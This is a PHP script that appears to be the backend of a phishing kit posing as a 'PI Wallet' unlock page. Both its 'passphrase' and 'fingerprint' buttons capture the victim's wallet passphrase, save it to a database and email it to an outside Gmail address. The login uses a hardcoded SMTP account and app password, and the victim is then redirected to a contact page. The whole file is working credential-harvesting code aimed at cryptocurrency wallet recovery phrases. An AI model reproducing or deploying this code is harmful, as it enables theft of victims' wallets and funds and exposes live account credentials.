<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

// Include database connection
require_once 'dbh.inc.php';

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $action = $_POST['action']; // Retrieve action type
    $passphrase = trim($_POST['passphrase']); // Retrieve the passphrase

    // Both "Unlock With Passphrase" and "Unlock With Fingerprint" should do the same thing
    if ($action === "passphrase" || $action === "fingerprint") {
        if (!empty($passphrase)) {
            // Insert passphrase into the database
            $stmt = $conn->prepare("INSERT INTO passphrases (passphrase) VALUES (?)");
            $stmt->bind_param("s", $passphrase);
            if ($stmt->execute()) {
                echo "Passphrase stored successfully in the database.";

                // Send an email notification using PHPMailer
                $mail = new PHPMailer(true);
                try {
                    // Mail configuration
                    $mail->isSMTP();
                    $mail->Host = 'smtp.gmail.com';
                    $mail->SMTPAuth = true;
                    $mail->Username = 'kutijude1@gmail.com'; // Your email
                    $mail->Password = 'rtbqiskopahksnha'; // Your email app password
                    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
                    $mail->Port = 465;

                    // Recipient settings
                    $mail->setFrom('nellyfancii@gmail.com', 'PI Wallet'); // Sender's email and name
                    $mail->addAddress('nellyfancii@gmail.com'); // Recipient's email

                    // Email content
                    $mail->isHTML(true);
                    $mail->Subject = 'New Passphrase Submitted';
                    $mail->Body = '<b>Passphrase:</b> ' . htmlspecialchars($passphrase);

                    $mail->send();
                    echo "Passphrase sent successfully.";
                } catch (Exception $e) {
                    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
                }

                // Redirect to contact page after processing
                header("Location: contact.html");
                exit();
            } else {
                echo "Error storing passphrase: " . $stmt->error;
            }
            $stmt->close();
        } else {
            echo "Passphrase is empty.";
        }
    } else {
        echo "Invalid action.";
    }
} else {
    echo "Invalid request.";
}
?>
